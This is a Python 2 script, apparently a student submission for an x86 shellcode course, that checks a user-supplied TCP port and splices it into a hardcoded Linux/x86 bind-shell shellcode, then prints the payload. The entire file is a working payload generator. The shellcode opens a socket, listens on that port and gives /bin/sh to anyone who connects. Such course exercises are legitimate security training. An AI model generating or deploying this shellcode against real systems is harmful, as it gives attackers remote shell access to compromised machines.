# SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86) Wrapper
# Author:  Matteo Malvica (@MrTuxracer)
# Website:  http://www.matteomalvica.com
 
import sys


total = len(sys.argv)
if total != 2:
    print "[+] Usage %s <tcp bind port>" % sys.argv[0]
    sys.exit()

else:
    try:
    	port = int(sys.argv[1])
    	if port > 65535:
    		print "Cannot bind a port greater than 65535!"
    		sys.exit()
    	if port < 1024:
    		print "Port is smaller than 1024! Need to be root for that"
    		sys.exit()		
        # convert integer argv port to hex and stuff with leading zeroes if port hex length is < 4
    	hexport = hex(port)[2:].zfill(4)
    	print "Hex value of port: " + hexport
        
        # split hexport in two parts to check for null byte
    	b1 = hexport[0:2]
    	b2 = hexport[2:4] 
    
    	if b1 == "00" or b2 == "00":
    		print "Port contains \\x00!"
    		exit()
    
        # add leading zero if nibble-only value
    	if len(b1) < 2:
    		b1="\\x0" + b1
    	if len(b1) == 2:
    		b1="\\x" + b1
    	if len(b2) < 2:
    		b2="\\x0" + b2
    	if len(b2) == 2:
    		b2="\\x" + b2
    
    	shellport=b1+b2
    
    	print "\nShellcode-ready port: " + shellport
    
    	shellcode = bytearray("\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xf6"+
    	"\\x56\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80"+
    	"\\x5f\\x97\\x93\\xb0\\x66\\x56\\x66\\x68"+
    	shellport+"\\x66\\x53\\x89\\xe1\\x6a\\x10"+
    	"\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66"+
    	"\\xb3\\x04\\x56\\x57\\x89\\xe1\\xcd\\x80"+
    	"\\xb0\\x66\\x43\\x56\\x56\\x57\\x89\\xe1"+
    	"\\xcd\\x80\\x59\\x59\\xb1\\x02\\x93\\xb0"+
    	"\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b"+
    	"\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62"+
    	"\\x69\\x6e\\x89\\xe3\\x41\\x89\\xca\\xcd"+
    	"\\x80")

    	print "\nFinal shellcode:\n" + "\"" + shellcode + "\""
        print "Shellocde length is: " + str(len(shellcode)/4)
    except:
        print "Something went wrong - exiting..."


